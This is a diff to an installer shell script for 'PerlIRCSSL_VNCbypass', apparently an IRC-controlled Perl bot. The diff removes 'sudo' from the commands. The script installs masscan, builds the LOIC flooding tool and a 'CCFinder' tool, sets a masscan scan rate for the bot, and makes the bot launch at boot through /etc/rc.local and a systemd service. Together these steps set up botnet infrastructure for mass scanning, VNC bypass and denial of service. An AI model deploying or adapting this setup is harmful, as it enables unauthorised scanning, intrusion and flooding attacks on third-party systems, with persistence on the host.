@@ -6,26 +6,26 @@ echo 'https://github.com/independentcod/PerlIRCSSL_VNCbypass';
 read -p "Install required packages? Y or LEAVE BLANK + ENTER" choice
 case $choice in
  Y) if [ -f "/usr/bin/yum" ]; then
-    sudo yum install epel-release openssl-devel boost-devel libpcap-devel perl-CPAN* cmake -y;
-sudo yum groupinstall "Development Tools" -y;
+     yum install epel-release openssl-devel boost-devel libpcap-devel perl-CPAN* cmake -y;
+ yum groupinstall "Development Tools" -y;
 perl -MCPAN -e install CPAN;
 perl -MCPAN -e reload CPAN;
-sudo cpan -fi Digest::MD5;
-sudo cpan -fi Net::SSLeay; 
-sudo cpan -fi IO::Socket::SSL; 
-sudo cpan -fi Time::HiRes;
-sudo cpan -fi Mojolicious; 
-sudo cpan -fi Mojo::IRC;
-sudo cpan -fi Net::Address::IP::Local;
+ cpan -fi Digest::MD5;
+ cpan -fi Net::SSLeay; 
+ cpan -fi IO::Socket::SSL; 
+ cpan -fi Time::HiRes;
+ cpan -fi Mojolicious; 
+ cpan -fi Mojo::IRC;
+ cpan -fi Net::Address::IP::Local;
 fi
 if [ -f "/usr/bin/apt" ]; then
-sudo apt-get update;
-sudo apt-get install build-essential python3-dev perl libboost-all-dev libssl-dev masscan libpcap-dev cpan-listchanges cmake cpanminus cpanoutdated -y;
+ apt-get update;
+ apt-get install build-essential python3-dev perl libboost-all-dev libssl-dev masscan libpcap-dev cpan-listchanges cmake cpanminus cpanoutdated -y;
 perl -MCPAN -e install CPAN;
 perl -MCPAN -e reload CPAN;
-sudo cpan -fi Mojo::IRC;
-sudo cpan -fi IO::Socket::SSL;
-sudo cpan -fi Net::Address::IP::Local;
+ cpan -fi Mojo::IRC;
+ cpan -fi IO::Socket::SSL;
+ cpan -fi Net::Address::IP::Local;
 fi
 esac
 cd ~/PerlIRCSSL_VNCbypass
@@ -33,14 +33,14 @@ git clone https://github.com/xymostech/loic.git;
 cd loic;
 make -j8;
 cd ..;
-sudo mv loic/loic /bin/loic;
-sudo chmod +x /bin/loic;
+ mv loic/loic /bin/loic;
+ chmod +x /bin/loic;
 rm -rf loic/;
 git clone https://github.com/independentcod/CCFinder;
 cd CCFinder/CCFinder-Linux/;
-cmake . && make -j8 && sudo make install;
+cmake . && make -j8 &&  make install;
 sh bootstrap.sh;
-sudo mv ccfinder ../../;
+ mv ccfinder ../../;
 cd ~/PerlIRCSSL_VNCbypass
 clear;
 read -p "Proceed to bot configurations? Y or LEAVE BLANK + ENTER" choice
@@ -73,8 +73,8 @@ fi
 if read -p "Masscan RATE-LIMIT/Recommended: 25000" mrate; then
  sed -i "perlircssl.pl" -e "s|--rate 25000|--rate "$mrate"|g" "perlircssl.pl"
 fi
-sudo mv rc-local.service /etc/systemd/system/rc-local.service;
-sudo systemctl enable rc-local;
+ mv rc-local.service /etc/systemd/system/rc-local.service;
+ systemctl enable rc-local;
 echo '#!/bin/sh -e' >rc.local;
 if [ $USER = "root" ]
 then
@@ -83,11 +83,11 @@ else
 echo perl /home/$USER/PerlIRCSSL_VNCbypass/perlircssl.pl >>rc.local;
 fi
 echo exit 0 >>rc.local;
-sudo mv rc.local /etc/;
-sudo chown $USER /etc/rc.local;
-sudo chmod 755 /etc/rc.local;
+ mv rc.local /etc/;
+ chown $USER /etc/rc.local;
+ chmod 755 /etc/rc.local;
 read -p "In order for bot to work you need to be operator in the channel, it also must be registered with services and YOU MUST autovoice your bots else you will not get any output in the server, ARE YOU READY TO LAUNCH THE PERL SCRIPT??? (Y or LEAVE BLANK + ENTER" choices
 case $choices in
- Y) sudo perl perlircssl.pl &;;  
+ Y)  perl perlircssl.pl &;;  
 esac
 esac
